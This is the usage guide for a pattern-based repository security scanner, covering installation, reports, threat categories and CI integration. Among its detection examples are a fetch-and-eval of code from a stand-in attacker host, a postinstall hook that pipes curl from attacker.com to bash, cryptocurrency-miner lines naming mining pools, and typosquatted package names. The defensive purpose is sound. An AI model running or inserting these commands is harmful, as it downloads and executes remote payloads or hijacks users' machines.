# Usage Guide - Repository Security Scanner

## Quick Start

### 1. Installation

```bash
# Clone the repository
git clone https://github.com/PKB12022/repo-security-scanner.git
cd repo-security-scanner

# Install dependencies
pip install -r requirements.txt

# Make scanner executable
chmod +x scanner.py
```

### 2. Basic Scanning

Scan a local repository:

```bash
python scanner.py /path/to/repository
```

**Output Shows:**
- 🟢 **GREEN (SAFE)** - No threats detected, repository is secure
- 🔴 **RED (CRITICAL)** - Threats found with exact locations and usage details
- File paths and line numbers where threats are located
- **What it does** - Detailed explanation of each threat
- Code snippets showing the problematic patterns
- Matched patterns that triggered the detection

### 3. Generate Reports

**JSON Report:**
```bash
python scanner.py /path/to/repo --json --output report.json
```

**HTML Report:**
```bash
python scanner.py /path/to/repo --html --output report.html
```

**Both:**
```bash
python scanner.py /path/to/repo --output report.json --html
```

---

## Output Format

### Safe Repository (🟢 GREEN)

```
════════════════════════════════════════════════════════════════════════════════════════════════════
✅ SECURITY STATUS: SAFE
════════════════════════════════════════════════════════════════════════════════════════════════════
No malicious or suspicious threats detected!
Repository appears safe to use.

════════════════════════════════════════════════════════════════════════════════════════════════════
📈 FINAL RISK ASSESSMENT
════════════════════════════════════════════════════════════════════════════════════════════════════
🟢 SAFE (0/1000)
✅ SAFE - Repository appears secure to use
════════════════════════════════════════════════════════════════════════════════════════════════════
```

### Unsafe Repository (🔴 CRITICAL)

```
════════════════════════════════════════════════════════════════════════════════════════════════════
🚨 SECURITY STATUS: CRITICAL - 3 THREAT(S) DETECTED
════════════════════════════════════════════════════════════════════════════════════════════════════

────────────────────────────────────────────────────────────────────────────────────────────────────
🔴 CRITICAL │ CRYPTOCURRENCY MINING
────────────────────────────────────────────────────────────────────────────────────────────────────

[THREAT #1]
📍 Location: src/worker.js:142
🔴 Type: XMRig Mining
📝 What it does: XMRig or CoinHive cryptocurrency miner detected - unauthorized CPU usage for Monero mining
💻 Code detected:
    const miner = new CoinHive('pool.minexmr.com', 'YOUR_WALLET_ADDRESS');
🎯 Pattern matched: CoinHive

[THREAT #2]
📍 Location: src/miner.js:78
🔴 Type: Mining Pool Connection
📝 What it does: Connection to cryptocurrency mining pool detected - enables remote mining operations
💻 Code detected:
    const poolUrl = 'stratum+tcp://pool.supportxmr.com:3333';
🎯 Pattern matched: pool.supportxmr.com

════════════════════════════════════════════════════════════════════════════════════════════════════
📈 FINAL RISK ASSESSMENT
════════════════════════════════════════════════════════════════════════════════════════════════════
🔴 CRITICAL (150/1000)
⛔ DO NOT USE THIS REPOSITORY - Contains serious security threats
════════════════════════════════════════════════════════════════════════════════════════════════════
```

---

## Threat Categories & Examples

### 🔴 CRITICAL Threats

#### 1. Cryptocurrency Mining
- **What it does:** Secretly uses your CPU/GPU to mine cryptocurrency (Monero, Bitcoin)
- **Location:** Shows exact file path and line number
- **Indicators:** XMRig, CoinHive, monero-miner, mining pools
- **Example:**
  ```javascript
  const miner = new CoinHive('pool.minexmr.com', 'wallet_address');
  miner.start();
  ```
- **Impact:** Slows down system, increases electricity costs, degrades performance

#### 2. Arbitrary Code Execution (ACE)
- **What it does:** Executes any code provided by user input - complete system compromise
- **Location:** Shows exact line where eval/Function is used
- **Indicators:** `eval()`, `Function()`, `exec()`, `system()` with user data
- **Example:**
  ```javascript
  eval(process.argv[2]);  // Attacker can run any code
  ```
- **Impact:** Attacker gains full control of your system

#### 3. Remote Code Download & Execution
- **What it does:** Downloads and runs code from attacker's server
- **Location:** Shows download URL and execution point
- **Indicators:** `fetch()` + `eval()`, dynamic imports, package installations from URLs
- **Example:**
  ```javascript
  fetch('http://attacker.com/malware.js')
    .then(r => r.text())
    .then(code => eval(code));
  ```
- **Impact:** Malware installation, ransomware, botnet recruitment

#### 4. Webcam/Microphone Access
- **What it does:** Accesses your camera and microphone without permission
- **Location:** Shows which function requests hardware access
- **Indicators:** `getUserMedia()`, `MediaRecorder`, hardware permissions
- **Example:**
  ```javascript
  navigator.mediaDevices.getUserMedia({ video: true });
  ```
- **Impact:** Privacy violation, unauthorized recording, surveillance

#### 5. Screen Capture
- **What it does:** Records your entire screen including passwords and private data
- **Location:** Shows screen capture function location
- **Indicators:** `getDisplayMedia()`, `canvas.toDataURL()`, `captureStream()`
- **Example:**
  ```javascript
  navigator.mediaDevices.getDisplayMedia({ video: true });
  ```
- **Impact:** All screen content sent to attacker (passwords, banking, messages)

---

### 🟠 HIGH Threats

#### 6. Suspicious Data Collection
**Keystroke Logging:**
- **What it does:** Records every key you press
- **Location:** Shows event listener location
- **Impact:** Captures passwords, messages, search queries

**Geolocation Tracking:**
- **What it does:** Tracks your physical location
- **Impact:** Privacy violation, stalking, targeting

**Browser Fingerprinting:**
- **What it does:** Creates unique identifier of your device
- **Impact:** Tracked across websites, privacy erosion

**Clipboard Monitoring:**
- **What it does:** Reads what you copy/paste
- **Impact:** Theft of passwords, credit cards, sensitive data

#### 7. Malicious Dependencies
- **What it does:** Installs harmful packages that automatically run on install
- **Location:** Shows package.json with suspicious packages
- **Indicators:** Typosquatted packages, custom registries, post-install scripts
- **Examples:**
  - `expresss` (instead of `express`)
  - `bcrypts` (instead of `bcrypt`)
  - `npm install --registry http://malicious.com`
  - Post-install hooks: `"postinstall": "curl http://attacker.com/setup.sh | bash"`
- **Impact:** Malware installed system-wide, credential theft, data exfiltration

---

## Risk Score Calculation

| Risk Level | Score | Status | Recommendation |
|-----------|-------|--------|-----------------|
| **🔴 CRITICAL** | ≥ 100 | 🚫 DO NOT USE | Serious threats detected. Report to maintainer. |
| **🟠 HIGH RISK** | 50-99 | ⚠️ REVIEW CAREFULLY | Review flagged code before using. |
| **🟡 MEDIUM RISK** | 20-49 | ⚠️ INVESTIGATE | Examine suspicious patterns. |
| **🟢 SAFE** | 0-19 | ✅ SAFE | Safe to use. |

**Score Calculation:**
- Critical threat = +100 points
- High threat = +50 points  
- Medium threat = +20 points

---

## Real-World Examples

### Example 1: Scan a Downloaded LLM Repository

```bash
# User wants to use a popular LLM from GitHub
git clone https://github.com/random-user/awesome-llm.git
cd awesome-llm

# Scan before running
python /path/to/scanner.py .

# Output shows if repository is safe or contains threats
```

### Example 2: Check Dependencies Before Installation

```bash
# Before running npm install
python scanner.py .

# Shows if package.json contains malicious dependencies
# Shows if post-install scripts are suspicious
```

### Example 3: Verify Open Source Project

```bash
# Security researcher checking a project
python scanner.py /path/to/project --html --output security-report.html

# Share report with others
# Open security-report.html in browser for full details
```

---

## Advanced Features

### Generate Detailed HTML Report

```bash
python scanner.py /path/to/repo --html --output report.html
```

**HTML Report includes:**
- Risk dashboard with statistics
- Color-coded threat severity
- Interactive threat table with details
- File locations and line numbers
- Recommendations based on findings

### Generate JSON Report for Automation

```bash
python scanner.py /path/to/repo --json --output report.json
```

**JSON output useful for:**
- CI/CD pipeline integration
- Automated threat analysis
- Data processing and analysis
- Machine-readable format

### Integrate with GitHub Actions

```yaml
name: Security Check
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Scan for threats
        run: |
          pip install -r requirements.txt
          python scanner.py . --json --output scan-result.json
```

---

## What Gets Scanned

### File Types Scanned
- Python: `.py`
- JavaScript/TypeScript: `.js`, `.ts`, `.jsx`, `.tsx`
- Compiled: `.java`, `.cpp`, `.c`, `.go`, `.rb`, `.php`
- Scripts: `.sh`, `.bash`
- Config: `.json`, `.yaml`, `.yml`, `.html`

### What's Skipped (Automatic)
- `node_modules/`, `.git/`, `dist/`, `build/`
- Binary files (`.exe`, `.dll`, images)
- Files > 1MB (performance optimization)
- Virtual environments (`venv/`, `.venv/`)

---

## Limitations

1. **Pattern-Based Detection** - Not AI-powered
   - May miss obfuscated malicious code
   - Always manually review flagged code

2. **False Positives** - Legitimate code might trigger alerts
   - Example: Legitimate use of `eval()` in developer tools
   - Context matters - review carefully

3. **Context Dependent** - Patterns without context
   - Some legitimate tools use similar patterns
   - Evaluate intent of the code

---

## Testing the Scanner

Test with example files:

```bash
# Create test file with malicious pattern
echo "const miner = new CoinHive('pool.minexmr.com');" > test.js

# Scan
python scanner.py test.js

# Should detect cryptocurrency mining threat
```

---

## Support & Contributing

- **Report Bugs:** GitHub Issues
- **Suggest Features:** GitHub Discussions  
- **Add Detection Patterns:** Pull Request with new patterns in `threat_patterns.py`
- **Improve Documentation:** Contributions welcome

---

## Security Disclaimer

This scanner uses pattern-matching to detect common malicious patterns. It:
- ✅ Catches common threats effectively
- ⚠️ May have false positives/negatives
- 🔍 Should be used with manual code review
- 📋 Complements, not replaces, security audits

**Always:**
1. Review flagged code manually
2. Check with repository maintainer
3. Consult security experts for critical systems
4. Keep scanner patterns updated

---

## License

MIT License - Free to use, modify, distribute

See `LICENSE` file for details.

---

## Questions?

For detailed threat documentation, see the README.md

For examples of malicious code patterns, see `examples.py`
